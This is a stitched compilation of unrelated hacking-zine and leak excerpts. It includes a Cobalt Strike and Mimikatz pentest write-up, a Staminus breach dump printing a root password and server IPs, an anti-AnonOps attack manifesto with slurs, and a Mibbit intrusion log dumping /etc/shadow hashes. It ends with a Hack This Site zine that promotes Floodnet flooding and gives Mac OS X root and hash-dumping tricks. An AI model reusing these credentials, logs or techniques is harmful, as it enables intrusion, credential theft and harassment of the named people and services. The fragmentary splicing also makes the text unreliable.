HTTPS beacons. Additionally, we created a custom profile that makes Beacon traffic look like normal web browsing using the **Malleable C2** feature of Beacon. Raphael Mudge created Cobalt Strike, and has several examples of custom Beacon C2 profiles on his GitHub (https://github.com/rsmudge/Malleable-C2-Profiles)\r\n\r\n> Why: I used this engagement to test out features of Cobalt Strike against a reasonably monitored network (I knew that the network is monitored, so I wanted to see how effective Cobalt Strike was for hiding my activity).\r\n\r\n- - -\r\n\r\nUse Beacons to run **Mimikatz** (integrated in Beacon), get plaintext credentials for users that have logged into the system recently. No domain admins yet.\r\n\r\n- Mimikatz is a tool for attacking Windows secrets. Allows you to dump Kerberos secrets, create Golden Tickets, view plaintext credentials (if wdigest is enabled).\r\n\r\n- - -\r\n\r\nRan BloodHound (https://github.com/adaptivethreat/BloodHound) to analyze Active Directory trust relationships, and find a path to the Domain Admins group. Showed several other systems across the domain that I could psexec to with the credentials I had.\r\nUsed Beacon’s SMB linking to spawn new Beacons to those systems, dumping cleartext credentials with Mimikatz on each of them. Only one compromised host actually talked to the internet, the rest just communicated through that single Beacon.\r\n\r\n> Why: The fewer hosts sending odd traffic to the internet, the less suspicious you will be. Linking Beacons internally allowed me to control multiple hosts without having a system talking to the internet in an unusual manner.\r\n\r\n**EXAMPLE** Beacon linked architecture:\r\n\r\n```\r\n                                              <---SMB---> Host 2 (SMB Beacon)\r\n                                            /\r\nC2 Server <---HTTPS---> Host 1 (HTTPS Beacon)<---SMB---> Host 3 (SMB Beacon)\r\n                                            \\\r\n                                              <---SMB---> Host 4 (SMB Beacon)\r\n```\r\n\r\nOne of those systems had cached credentials for a domain administrator. Used that to authenticate to Domain Controller, psexec to add Beacon link to DC, dumped hashes for entire domain.\r\n\r\n- - - \r\n\r\n**NEXT STEPS**: Time to hunt for valuable data! The pentest is not over when you get Domain Admin, you want to show the ramifications of compromising a Domain Admin, and find how to best demonstrate that to the customer."]}

was a real treat and one that completely blindsided our team. After pillaging and generally shitting on\r\n         the entirety of Staminus' & co's infrastructure, it was discovered that one of the client box's was housing a real gem.\r\n         Yes, that's right, Staminus was hosting the KKK and it's affiliates. An organization legally recognized in some regions\r\n         as a terrorist collective. Not that we hold anything against the KKK. Choosing such an awful host as Staminus however is\r\n         unforgiveable, and consequently they had to be punished.\r\n             \r\n    :: SNIP ::\r\n        Hello Rachel Pendergraft,\r\n\r\n        Your server is complete.\r\n\r\n        Here is your server information:\r\n\r\n        Administrative IP: 69.197.2.214 (Private Use)\r\n        Protected IP: 69.197.31.193 (Public Use)\r\n        User: root\r\n        Password: TkBNk7TdrSh2Uq42\r\n        Secondary Usable IP&#039;s: 69.197.31.193 - 69.197.31.206\r\n\r\n        Please remember to not give out your Administrative IP [69.197.2.214].

Various attempts have been made in the past to\r\ncourse correct AnonOps, but the totalitarian IRC operator regime has remained\r\nintact.\r\n    The AnonOps network prides itself in being \"secure\", however, such is not\r\nthe case. Rather, they employ incompetent and highly unprofessional channel and \r\nIRC operators, allowing their personal grudges to interfere with the operation\r\nof a secure network for Anonymous. Newcomers to the network are welcomed by a\r\nspirit of condescention and arrogance, as any legitimate question or concern is\r\nslowly drowned out by the laughter of the senior members of the chatroom.\r\nChannel operators rather than discourage such behavior, applaud it, joining in,\r\nand using their powers to kick, ban, or SAJOIN newcomers to #kill. Any attempt\r\nto speak out against the way the network is ran is met with kick, ban, or zline.\r\nA decentralized organization such as Anonymous cannot thrive on a network ran by\r\nsuch people as Power2All, Wolfy, Owen and Shitstorm. Anonymous transcends beyond\r\none IRC network, or one social medium. Spread. Be aware. Educate. Anonymous is\r\nan idea; ideas are bulletproof. \r\n    Anonymous cannot be owned or controlled by a small group of faggot\r\ntotaltarian operators. Thus we have decided to lombotomize the cancer that is\r\nAnonOps from the internet. AnonOps no longer stands with Anonymous, but rather\r\nagainst us as an agent of censorship, unlulzy pseudo-activism and immense\r\nfaggotry, and thus must be eliminated. \r\n    AnonOps has proven itself insecure and fault prone in the past. We are here\r\nto illustrate these points again. AnonOps is NOT Anonymous, and throughtheir\r\nactions, they have proven themselves against our ideals. Welcome to thecourt of\r\nthe internet, AnonOps. You shall be persecuted for your crimes against the\r\nfreedom of chats, your utter and repeated failure as an IRC network, your aid to\r\nthe spread of namefagging, and your gross negligence in securing the identities\r\nof those whom chat and remain Anonymous on your network. \r\n    AnonOps has shown time and time again it is too large of a target, and very\r\nwell capable of corrupting the ideals which fuels the fight in every Anon.\r\nAs long as AnonOps stay online, they will continue to adulterate our cause,\r\nbastardizing ideals of Anonymous, and running a network where the only lulz to\r\nbe had are that of the failures whom chat there and run the network. Such\r\nactivity cannot continue. \r\n\r\nLet's drop the formalities now, and get down to business!\r\n\r\n                        :: 0x02 - s3rv1c3s pwn ::\r\n                 ¡HOLA! ¡CARLOS1337 AQUI CON UN NUEVO ZINE!\r\n        ~~~ JAJA ANONOPS ESTOY MUERTO: ¡AY CARAMBA! ¡UNA CERO DIA! ~~~\r\n\r\nAfter probing AnonOps for quite a while, we figured out that they were using\r\na vulnerable version of Anope IRC Services.

It seems they have succeeded in \r\ndefacing the name of the anti-sec movement, turning it into a faux-revolutionary battle cry in the form of #antisec. \r\nHowever, anti-sec is not what it is being portrayed as. In actuality, anti-sec is the practice of keeping one's \r\nexploits and hacks to oneself for the good of everyone else (or personal profit, depending on who you ask). LulzSec, I \r\nwould throw in a note here, but it seems I'm too late, most of you are already raided. To the rest, make your time.\r\n\r\nNot on the front page of the latest hacking busts and takedowns, the more skilled among us know not to broadcast our \r\nvarious 0wnages. We silently slip in and sift through large networks. Releases are private. Obviously, when you have a \r\ngroup that comes along such as Lulzsec, the question is not what they will get into, but how long they will last.\r\n\r\nMore importantly, I would like to establish that the former Scene has very nearly disappeared since the rise of groups \r\nlike Lulzsec. Blindly exploiting and staging large scale unjustified attacks against arbitrary organizations is not the \r\nmentality of hacking. Hacking is about curiousity. Hacking is about information. Attacking government entities so you \r\ncan give the media your devoid justice statement is not hacking. It's called bullshit. I've seen enough garbage from \r\nLulzsec releases.\r\n\r\nToday, we would like to provide the community with a special release, exclusively for all of the skidiots on Mibbit \r\nfueling Lulzsec/#antisec efforts. Enjoy.\r\n\r\n- HTP\r\n\r\n\r\ntarg3t:\r\n\r\n-                           Mibbit\r\n\r\n0wn3d:\r\n\r\n -               Axod       Azander    Havvy\r\n -               Hercule    Joshua     Kitsune\r\n -               Molkmin    Pottsi     Sindacious\r\n\r\n\r\n:: 0x02 - 0wnage - tools.mibbit.com ::\r\n[h () ck ~]$ ssh root () tools mibbit com\r\nroot () tools mibbit com's password: \r\nLast login: Fri Aug 12 23:16:22 2011 from [redacted]\r\nroot () tools:~# uname -a\r\nLinux tools.mibbit.com 2.6.32.16-linode28 #1 SMP Sun Jul 25 21:32:42 UTC 2010 i686 GNU/Linux\r\nroot () tools:~# cat /etc/passwd /etc/shadow\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\nbin:x:2:2:bin:/bin:/bin/sh\r\nsys:x:3:3:sys:/dev:/bin/sh\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/bin/sh\r\nman:x:6:12:man:/var/cache/man:/bin/sh\r\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\r\nmail:x:8:8:mail:/var/mail:/bin/sh\r\nnews:x:9:9:news:/var/spool/news:/bin/sh\r\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\r\nproxy:x:13:13:proxy:/bin:/bin/sh\r\nwww-data:x:33:33:www-data:/var/www:/bin/sh\r\nbackup:x:34:34:backup:/var/backups:/bin/sh\r\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\r\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\r\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\r\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\r\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\r\nsyslog:x:101:103::/home/syslog:/bin/false\r\nntp:x:102:104::/home/ntp:/bin/false\r\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\r\nwwwadmin:x:1000:1000::/home/wwwadmin:/bin/bash\r\nmysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false\r\nDebian-exim:x:105:107::/var/spool/exim4:/bin/false\r\nroot:$1$6793e8d9$aGW9MH6RaZmSP4Tncpwrb1:14728:0:99999:7:::\r\ndaemon:*:14728:0:99999:7:::\r\nbin:*:14728:0:99999:7:::\r\nsys:*:14728:0:99999:7:::\r\nsync:*:14728:0:99999:7:::\r\ngames:*:14728:0:99999:7:::\r\nman:*:14728:0:99999:7:::\r\nlp:*:14728:0:99999:7:::\r\nmail:*:14728:0:99999:7:::\r\nnews:*:14728:0:99999:7:::\r\nuucp:*:14728:0:99999:7:::\r\nproxy:*:14728:0:99999:7:::\r\nwww-data:*:14728:0:99999:7:::\r\nbackup:*:14728:0:99999:7:::\r\nlist:*:14728:0:99999:7:::\r\nirc:*:14728:0:99999:7:::\r\ngnats:*:14728:0:99999:7:::\r\nnobody:*:14728:0:99999:7:::\r\nlibuuid:!:14728:0:99999:7:::\r\nsyslog:*:14728:0:99999:7:::\r\nntp:*:14728:0:99999:7:::\r\nsshd:*:14728:0:99999:7:::\r\nwwwadmin:$6$.EejimbY$xKAXfpd3nBlNeoQ6pBWBqh673jW2ytSmL5WoUkXaRxadV/fUIM2nQcxm1mGzk1YI9t3yQH8XMzpzSHpNv1jb00:15048:0:99999:7:::\r\nmysql:!:15048:0:99999:7:::\r\nDebian-exim:!:15075:0:99999:7:::\r\nroot () tools:~# ps aux | grep log\r\nroot       201  0.0  0.0      0     0 ?

A magazine? I thought HTS was about\r\nwargames and security challenges. Yes, but over the\r\npast year we’ve experienced so much more with the development\r\nof the IRC server, user-submitted articles and\r\nresources, forums, and the internal staff structure. We’ve\r\nbecome a living community with many on-going projects\r\nmanaged by active users sharing their experiences with\r\nothers. It has become necessary to begin publishing a\r\nmagazine to explore the hacking scene. The movement\r\nwe were building has more social signifi cance than a\r\nmere training ground.\r\n\r\nActivism? I thought this was a hacking zine...\r\n\r\nPurely hacker zines have been done to death thousands\r\nof times, never making any impact in the status\r\nquo by shaping culture or politics. Instead of reinventing\r\nthe wheel and competing with other larger distros by\r\nmerely keeping up with the latest tech news, we’re going\r\nto be discussing the practical usage of hacking skills as\r\na means to fi ght for social justice. Considering today’s\r\npolitical climate, it is becoming increasingly imperative\r\nthat we tune in to the world around us, to take a stance,\r\nand give a fuck.\r\n\r\nIt is foolish and destructive to expand one’s hacking skills\r\nwithout the development of social awareness, knowledge\r\nof current events, and political ideology. Our intention is\r\nnot merely to raise technical consciousness, but social\r\nand political as well. We intend to keep up with the latest\r\nhacktivist news - updates on electronic civil disobedience\r\ncampaigns, the latest threats of cyber tyranny against\r\nour civil rights, and ways people can get involved in the\r\ndigital freedom movement.\r\n\r\nThe New World Order\r\n\r\nNonstop cycles of fear, consumption and wage-slavery.\r\nWe are pumped full of fear-mongering propaganda so\r\nthat we willingly submit ourselves to the State’s oppression\r\n- giving them free reign to systematically destroy\r\nour freedoms and bring about a new age of big brother\r\nwell beyond the imagination of George Orwell. Initiatives\r\nlike Total Information Awareness, the USA PATRIOT Act,\r\nOperation TIPS, email monitoring systems, the Offi ce of\r\nHomeland Security, RFID product codes, and the continuous\r\nattempts to tap and monitor all mediums of communication\r\nmake it clear of the establishment’s intent to\r\ntransform our society into one where our every thought\r\nand movement is closely monitored and calculated to\r\nsee whether we are a threat to their cold, sterile dream\r\nof law and order.\r\n\r\nThere’s a fucking war on!\r\nWe are kept under tight control and surveillance so that\r\nthe military industrial complex can continue to manufacture\r\nbullshit pretexts for fake wars all for the profi t of the\r\nrich ruling classes The Bush administration has made a\r\nkilling in privatizing Iraq’s oil resources(Halliburton), reconstruction\r\nefforts(Bechtel), and otherwise allowing his\r\ncorporate buddies to loot Iraq for all it’s worth. For weapons\r\nof mass deception and no ties to Al-Qaeda or 9/11.\r\nAre we any safer from terrorist attacks? Every friend and\r\nfamily member of the tens of thousands of innocent civilians\r\nthat died in Iraq are now looking at ways of getting\r\nback at the U.S. The utter hypocrisy of the war on terror...\r\nwe have killed several times more people that have died\r\non 9/11. Pre-emptive war is state-sponsored terrorism.\r\nCarpet bombing cannot address the complex social and\r\npolitical factors that actually create anti-american terrorism\r\n- in fact, it feeds it.\r\n\r\nWe are building an international movement to defend the\r\nrights of all people to self-determination from the ruling\r\nclasses of nations worldwide. We want neither Bush,\r\nnor Saddam, nor Blair. Together we can organize in an\r\nopen and equal basis and build our own societies free of\r\nauthoritative power structures and parasitic bosses and\r\nrulers.\r\n\r\nThe Digital Freedom Movement\r\nWhile the madness of the State is spiralling towards self\r\ndestruction, we’ve built our own communities based on\r\nthe open spirit of free access to all information. Open\r\nsource programming has successfully developed some\r\nof the best softwares, operating systems, and mediums\r\nof communication - all free to own and free to share, independent\r\nof authoritative power structures. It is a practical\r\napplication of anarchist organizing principles.\r\n\r\nIt is of little surprise that our movement is under attack\r\nby large capitalists like Microsoft, SCO, and the record\r\nindustry. Because our software is free to own and free\r\nto share, their monopoly over computing and media industries\r\nis threatened because they cannot compete with\r\ntheir bloated, obsolete and expensive systems. Rather\r\nthan finding ways of integrating these fantastic services\r\ninto our society, corporations will go to any length to cling\r\nto their outdated models of profit and exploitation. We\r\nneed to directly to the heart of the matter: we are under\r\nattack, and we have to equip ourselves to fight back.\r\n\r\nIt’s one attack, one struggle.\r\nAll of these injustices are not unrelated. These struggles\r\nare linked, and everything is connected. It’s the system!\r\nFrom the presidents that bring the people to war, to the\r\ncops that beat protesters, to the bully on the playground\r\nstealing lunch money, it is becoming glaringly obvious\r\nthat we cannot trust figures of authority. It’s up to us to\r\norganize on a cooperative, anti-authoritarian basis and\r\nbuild our own free societies on the ashes of the old.\r\n\r\nWe don’t have a lot of time left. Whether it be the madness\r\nof the warring nations, or the destruction of the environment,\r\nor the depletion of natural resources... we are\r\nsimply consuming, reproducing, and expanding too fast\r\nfor our finite ecosystem to support us. Every species has\r\na carrying capacity. We are rapidly approaching ours.\r\n\r\nThis isn’t a call for pessimism, but rather the fantastic\r\npotential that we have the ability to create dissent, rise\r\nup and put direct pressure on those responsible for this\r\nmadness. Now that everything depends on complex networks\r\nof communication and the internet, hackers are\r\nin a unique position to mobilize their skills to fight for\r\nchange.\r\n\r\nHacking as a tool to fight for social justice?\r\nThe practical application of hacking skills to fight for freedom\r\nis a beautiful act of justice and liberation. If the Nazi\r\nmilitary utilized computer networks to coordinate troop\r\nmovements, hackers could have thrown their war machine\r\ninto disarray. If corporations and governments are\r\nout of line today, it’s up to cowboys of the electronic age\r\nto turn over the system and put the people on top. Electronic\r\ncivil disobedience, modern day Robin Hood, cyber\r\nactivism, hacktivists!\r\n\r\nCircumvent corporate media - Do It Yourself!\r\nThe forces that be are allowed to get away with murder\r\nbecause they own most channels of communication. The\r\nClearchannel Coporation owns 1225 radio stations and\r\n37 television stations. They are in the top 248 of the top\r\n250 radio markets. Television, news and radio networks\r\nare largely dominated if not monopolized by these large\r\ncorporations who have vested financial interests in supporting\r\ngovernment, war, and international neo-liberal\r\ntrade organizations. They fill us with their lies and distortions\r\nand turn us into unthinking, unquestioning followers\r\nof the establishment. Even in this age of internet enlightenment,\r\nhackers are portrayed as cyberterrorists.\r\n\r\nAt the center of Hack This Site is the drive to DO IT\r\nYOURSELF! Turn off that television, unplug yourself\r\nfrom their system, and make your own media! Underground\r\nliterature will not sugar coat the news fit for your\r\nunthinking consumption - we tell the uncensored truth,\r\nexplore controversy, create a platform for the free exchange\r\nof ideas, and don’t patronize our readers by\r\nsugar coating raw information.\r\n\r\nHack This Site!\r\nHack This Site is a training ground for people to gain\r\nthe skills and join the movement for digital freedom. We\r\nfacilitate a free, open learning environment where hackers\r\ncan test and expand their skills in a realistic and\r\nlegal environment Everyone should have access to all\r\ninformation, resources, and the opportunity to fulfill one’s\r\npotentials. Of course, providing such resources requires\r\ngreat responsibility to see that these skills are used for\r\npositive ends. We present the usage of hacking skills as\r\na means to fight for social justice as a positive alternative\r\nto mindless destructive black hatting. We’re building an\r\narmy so powerful we won’t need weapons. Our revolution\r\nwill require not bullets or casualties, but the curious\r\ndrive of a politically motivated generation of hackers who\r\nknow how to shift data around in the right direction.\r\nHackivists of the World, UNITE!\r\n\r\n\r\nFloodnet: Power to the People! by Trojan\r\n\r\nIn our modern age of internet enlightenment, new\r\nand innovative forms of protest are emerging\r\non the web. One tool spearheading the protest\r\nmovement is Floodnet. Floodnet is a java applet\r\nrefreshing a selected page every seven seconds.\r\nAlone this have no real purpose, but when hundreds\r\nor even thousands of floodnet users connect\r\nto a page, the surge in traffic easily can crash\r\na server. Many Major attacks have already been\r\nutilized including one on the Pentagon.\r\n\r\nThe program is genius in its simplicity. This strikes\r\nfear into the hearts of companies. The idea that\r\nthousands across the world can easily be armed\r\nfor virtual warfare strikes a deep chord within\r\nthem.\r\n\r\n“Strength in numbers” as they say. I was recently\r\ntold of one account in which the eCommerce site\r\n“Etoys” sued a smaller website, and floodnet community\r\nmember “Etoy”, claiming that etoy simply\r\ndesired traffic from typos of the word “Etoys.com”.\r\nThe members of the Electronic Disturbance Theatre\r\n(The Originators of Floodnet) threatened to\r\nhold a “Twelve days of Christmas” strike to bring\r\netoys stock to zero. Needless to say, etoys backed\r\ndown, and even payed for etoy’s court costs.\r\n\r\nWhat could be scarier to a company? They may\r\nbe used to having people hate them, but the\r\nidea of thousands that can strike back? So much\r\npower in the hands of the commoners? Floodnet\r\nallows for this.\r\n\r\n“Only art history still knows that the famed geniuses\r\nof the Renaissance did not just create\r\npaintings and buildings, but calculated fortresses\r\nand constructed war machines. If the phantasm of\r\nall Information Warfare, to reduce war to software\r\nand its forms of death to operating system crashes,\r\nwere to come true, lonesome hackers would\r\ntake the place of the historic artist-engineers.” -\r\nFrederich Kittler\r\n\r\nStrength in numbers indeed.\r\n\r\nMORE ON ELECTRONIC CIVIL DISOBEDIENCE:\r\n\r\nElectronic Disturbance Theatre\r\nthing.net/~rdom/ecd/ZapTact.html\r\n\r\nElectro Hippie Collective\r\nfraw.org.uk/ehippies/tools.shtml\r\n\r\nThe Hacktivist\r\nhttp://www.thehacktivist.com/\r\n\r\nThe Federation of Random Action\r\nhttp://www.this.is/etoytech/fra/\r\n\r\n\r\nElectronic Product Code / RFID:\r\nNew meaning to Big Brother\r\n\r\nAttacks on civil liberties and the Orwellian transformation\r\nof our country are not new concepts to\r\nthose who have not been living under a rock for\r\nthe past few years. We have legislation like the\r\nUSA PATRIOT Act that gives unprecedented police\r\nstate powers to law enforcement and government.\r\nWe have government spy agencies such as Total\r\nInformation Awareness (now named ‘terrorist information\r\nawareness’) that watches our credit card\r\npurchases, what library books we check out, websites\r\nwe visited, and where we travel. The Office of\r\nHomeland Security, Carnivore, Echelon, Operation\r\nTIPS, etc. But many people are relatively unaware\r\nof a new technology that when introduced to the\r\nmainstream will set new precendents to the survellience\r\npowers of corporations and governments.\r\n\r\nOver the next few years, the old UPC barcodes of\r\ntimes past will be replaced by the new Electronic\r\nProduct Code (EPC). This new system implements\r\na technology known as Radio Frequency Identification\r\n(RFID). They are mini chips that transmit radio\r\nwaves that contain unique identifying information.\r\nThese transmissions are picked up by nearby base\r\nstations which logs the time and location. Unlike\r\nthe UPC, these new EPC chips contain a unique\r\ncode for each individual instance of a product instead\r\nof just what type of product. This means they\r\nwill be able to track where your individual product\r\nis at any time.\r\n\r\nThe EPC will make its appearance in the mainstream\r\nquicker then you might imagine. By 2005,\r\nevery product sold at Walmart will contain these\r\nRFID tracking chips. Some corporations are already\r\nusing these chips(Gilette). Eventually, the\r\nUPC will be phased out completely and most consumer\r\nproducts will carry these chips. On your\r\nwatch, your shoes, your and you won’t be able to\r\nbuy something more expensive than a snickers bar\r\nthat doesn’t have an EPC chip. The European Union is\r\neven considering using this chips on cash (removing the\r\nanonymous quality desired by undergrond revolutionary\r\nhackers who do not trust the banks and credit card \r\ncorporations - and rightfully so!)\r\n\r\nCorporations say that these chips will be used to\r\ngather marketing information by monitoring what\r\nstores you shop at, where you live, and to prevent\r\nshoplifters. There is no current legislation about the\r\nplacement of these chips or it’s use - products containing\r\nRFID do not need to be marked or disabled\r\nas they leave the store.\r\n\r\nIt is not hard to understand the immense threat to\r\nour civil liberties that this new technology presents.\r\nSince they are already able to connect purchased\r\nproducts to the credit card information in your\r\nname, there is no end to the amount of information\r\nthey will have. We are not far off from a world\r\nwhere we can be tracked wherever we go from\r\nlittle chips embedded into our clothes, shoes, and\r\nwatches. A world where governments and corporations\r\nknow what shops we visit, what products we\r\nhave in our homes, and what we’re carrying on us\r\nat any given time. It sounds surreal, but these are\r\ncrazy times...\r\n\r\nThe RFID chips themselves can be disabled rather\r\neasily - but their strength is in their relatively inexpensive\r\nprice to produce and the ability for these\r\nchips to be rather obscurely hidden within consumer\r\nproducts. What needs to be explored is the\r\nservers and data capturing networks that log the\r\nmovement of these chips.

You can run this\r\nthrough any standard UNIX password cracker like\r\nJohn The Ripper(also available for Mac OS X at\r\nopenwall.com/john).\r\n\r\nAnother way of gaining root is to sudo su root\r\nit - allowing you access to a root prompt only by\r\nknowing an administrator account(which can be\r\nretreived through nidump). You can also reset the\r\nadministrator password by booting from a Mac\r\nOS X install cd.\r\n\r\nIf you have physical access to the machine, try\r\nrestarting and holding Command + S - this will\r\nboot into ‘Single User Mode’, which is essentially\r\na root shell. Note that you will not be able to dump\r\nthe passwd database until you load the NetInfo\r\nDatabase, which you can do so by runnng /sbin/\r\nSystemStarter.\r\n\r\nIf you’ve got shell access, there’s all sorts of fun\r\nthings you can do. Personally, I like Mac OS X’s\r\nbuilt-in speech engine used in conjunction with\r\nosascript, a command line AppleScript interpreter.\r\nTry executing this:\r\n\r\n[local:~] xec96% osascript -e ‘say “you are being\r\nwatched”’\r\n\r\nAssuming they have the volume turned up at a\r\nreasonable volume(you can set system volume\r\nby doing XXXXXXX), this will cause their computer\r\nto physically speak the given parameter. This\r\ncan provide an endless supply of amusement, especially\r\nif you are near enough as to hear the target\r\nhave entire conversations with their machine.\r\nSince you have access to AppleScript’s entire array\r\nof neato system functions, there are other fun\r\nthings to do as well.\r\n\r\n• Open browser to a specified website\r\n[local:~] xec96% osascript -e ‘open location\r\n“http://www.larrycarlson.com/the_end”’\r\n• Control iTunes and play music\r\n[local:~] xec96% osascript -e ‘tell application\r\n“iTunes”’ -e ‘next track’ -e “end tell” (also in place\r\nof ‘next track’, try ‘previous track’, ‘pause’, ‘play’,\r\nand ‘open “Macintosh HD:something.mp3”’)\r\n• Open all apps at once(essentially freezing)\r\n[local:~] xec96% open /applications/*\r\nFundamentals of Mac OS X Security\r\n\r\n[local:~] xec96% nidump passwd .\r\nroot:gRhAAGQx4AoKk:0:0::0:0:System Administrator:/var/root:/bin/tcsh\r\nxec96:Kh79zSBCAZos6:501:20::0:0:Jeremy Hammond:/Users/xec96:/bin/tcsh\r\n\r\n\r\nHacktivists Deface DARE.com in Act of Electronic Civil Disobedience\r\nrepublished from http://la.indymedia.org/news/2004/02/104143.php\r\n\r\nHackers have targeted DARE.com in political protest\r\nof the criminalization of marijuana, the hypocrisy of\r\nthe war on drugs, and the indoctrination of today’s\r\nyouth through the DARE program.\r\n\r\n“The establishment continues to ignore the positive\r\npsychological benefits of mind altering chemicals\r\nare used responsibly for the personal exploration of\r\nconsciousness. Marijuana, both harmless to society\r\nand ourselves, is not the problem. Marijuana laws\r\nare the problem. Millions of innocent people are\r\nunjustly imprisoned while corporate criminals and\r\nwar mongers are trusted to the highest positions of\r\nour government.”\r\n\r\nThe website was defaced on Feb 29, 2004 with\r\npro-legalization messages, criticisms of the\r\nDARE program, justifications for electronic civil\r\ndisobedience, and links to dozens of websites where\r\npeople can learn about the legalization movement,\r\nmind-expanding chemicals, political activism, and\r\nmore.\r\n\r\nThe hackers have done no permanent damage to\r\nthe systems, or released any sort of confidential\r\ndata - in fact, the hackers actually fixed the security\r\nholes to combat the media stereotype that hackers\r\nare malicious and destructive with a loose sense of\r\nsocial ethics.\r\n\r\n“We aren’t malicious, destructive, or have a loose\r\nsense of ethics like the government, corporate media,\r\nor right-wing maniacs would like to spin it. Those who\r\nopen-minded and curious enough to do the research\r\nand actually try to understand us will realize that we\r\nhave a highly refined sense of social ethics, more\r\nthan the machinery of the state will ever have.”\r\n\r\nThe hackers have also posted a flyer to help build for\r\nthe demonstrations against the Republican National\r\nConvention on August 29. rncnotwelcome.org\r\nHacktivists Deface DARE.com in Act of Electronic Civil Disobedience\r\nrepublished from http://la.indymedia.org/news/2004/02/104143.php\r\n\r\nNote from HTS staff: we are not defending the actions of the \r\nactions of the hackers who attacked DARE.com, but it is a \r\nwelcome change of pace to see a defacement that actually \r\nmade serious political points without causing any damage. \r\nThis is why we chose to feature this defacement in our zine. \r\nAll too often hackers step up on the soapbox and deface a \r\nmajor website and leave some lame message like ‘I h4x0r3d \r\nj00! c0nik was here - get more secure!’ If you are going to \r\ntake the time and risk breaking the law, then at least have \r\nsomething significant to say.\r\n\r\n\r\nMiami Police Riot as the\r\nRich Hide Behind Fences\r\n\r\nOn Thursday, November 20 2003, governments and the ultra-rich held the\r\nFree Trade Area of the Americas ministerial in Miami, Florida. The FTAA is a\r\ntrade agreement that decides the economic fate for 800 million people. Those\r\nworking on advancing the FTAA are seeking to create a “free-trade” block to\r\nencompass all of North and South America (minus Cuba). This is being done\r\nwith absolutely no citizen input and has no chance to ever be ratified by the\r\npeople it governs.\r\n\r\nIn the days before, the ultra-rich and government officials mingled in the\r\nAmerican Business Forum to craft a plan for the FTAA, and one that was\r\neventually accepted. The rich and powerful were frightened though, so much\r\nthat they constructed a massive “anarchist-proof” fence surrounding a large\r\npart of downtown Miami for the upcoming protests. Also, over 3000 police\r\nwere on duty, hired security for the interests of the upper class. Armed to the\r\nteeth with rubber bullets, pepper spray, tasers, taser shields, tear gas, batons,\r\nfull riot gear, shields, armored personnel carriers, blackhawk helicopters, and\r\nmore, they turned Miami into a militarized police state in the days leading up\r\nto the event. Over 32 law enforcement agencies participated in the effort- on\r\nthe streets there were everything from armed and deputized private security\r\ncontractors to Miami PD and even the Department of Homeland Security. 8.5\r\nmillion federal taxpayer dollars were spent on police efforts to protect the richest\r\n1% during the meetings. So why did the government decide to turn Miami,\r\namerika’s poorest large urban center, into a complete police state to protect\r\nthese scumbags?\r\n\r\nWell, they say it was because of anarchists...\r\nIn the months leading up to the ministerial, people from all over the hemisphere\r\nwere planning on making their way to Miami on November 20. All sorts\r\nof people mobilized for the Miami demonstration - Union workers, Students,\r\nFarmers, Indigenous Peoples, Anarchists, Communists, and Religious groups.\r\nThe governments of the amerikas have routinely used military-style police\r\nforce to violently silence the voices and intentions of the people during these\r\ndemonstrations. To justify their fascist behavior, they repeatedly claim that a\r\ngroup of “hard-core anarchists” come to destroy everything in the city and\r\ncause mayhem in the streets. This lie is pushed through the televisions, newspapers,\r\nand by police harassment of communities. By the time the demonstrations\r\ncome around, there is a media blackout on anything except for the sensationalized\r\npolice spin. The whole idea of “anarchists causing chaos” is actually\r\na fabricated historical argument, used since the 1800’s by the state and the\r\nrich to discredit the motives and smear the name of anarchists. Anybody who\r\ncan open their eyes knows that the FTAA is true violence, that the police and\r\nthe governments that sponsor them are the true violence, and most of the\r\nviolence in the world is caused by them. Anarchists want to trade that violence\r\nfor peace and justice for all of humanity, not just the rich and powerful.\r\n\r\nSo what happened?\r\nThe protests started with the Root Cause march beginning 34 miles awaymarching\r\none mile for every country involved with the FTAA. The Root Cause\r\nmarch involved many folks who are currently engaged in struggles against the\r\neffects of neoliberal capitalism- the Coalition of Immokalee Workers, Miami\r\nWorkers Center, Power U Center for Social Change, Low-Income Families\r\nFighting Together, and the Free Carnival Area of the Americas. On Thursday,\r\nNovember 20 was the main day of demonstration. Early morning saw a few\r\narrests from the more confrontational Direct Action marches. The largest\r\npermitted rally was the AFL-CIO march, where thousands were corralled and\r\nhumiliated by police. While this march was filing into the Bayfront ampitheatre\r\naround 4 P.M., a group of nearly 1000 people were dancing and milling about\r\nnear a police line. With no provocation, the police started firing rubber bullets,\r\npepper spray, pepper spray bullets, tear gas, and other projectiles into the\r\ncrowd. As the elderly, workers, students, and immigrants who couldn’t get\r\narrested started retreating, another police line blocked one of the two possible\r\nexit routes- channeling people into downtown Miami\r\nand eventually into a poor black neighborhood called\r\nOvertown. Militant protestors constructed makeshift barricades\r\nand put their bodies in front of the crowd. They\r\nalso defended the crowd fiercely, with slingshots, smoke\r\nbombs, chunks of concrete, and quick maneuvering to\r\noutpace the slow riot-gear clad stormtroopers. These\r\ntactics prevented a mass arrest from happening- the\r\npolice scanners were reporting that they were trying to\r\nsurround the large group but couldn’t because of it’s\r\nquickness. At the end of the day, there were about 50\r\narrests. Later that night word got out that a “FTAA-lite”\r\nwas drafted on Thursday.\r\n\r\nThe next day, hundreds of people went to the jail to\r\nshow support to their fallen comrades, and the legal\r\ndemonstration was surrounded by police as people were\r\nbeaten, pepper sprayed, and thrown in prison- even\r\nthough the crowd remained completely peaceful. The\r\nlegal defense team has confirmed that there were 4\r\ninstances of sexual assault upon prisoners and at least 6\r\ncases of physical torture in jails- ranging from the police\r\nand guards pepper-spraying inmates, beating inmates\r\nbloody, and hosing naked inmates down with freezing\r\nwater in cold cells. At least 2 people were sent to the\r\nhospital for head wounds, not counting the hundreds\r\nthat were treated by volunteer medics in the streets for\r\nexposure to tear gas, pepper spray, baton blows, rubber\r\nbullets, etc. Police actions have prompted the AFL-CIO,\r\nUnited Steelworkers of America, and the Alliance for\r\nRetired Americans to call for a congressional investigation\r\nof the police efforts for Miami.\r\n\r\nFree Trade = Slave 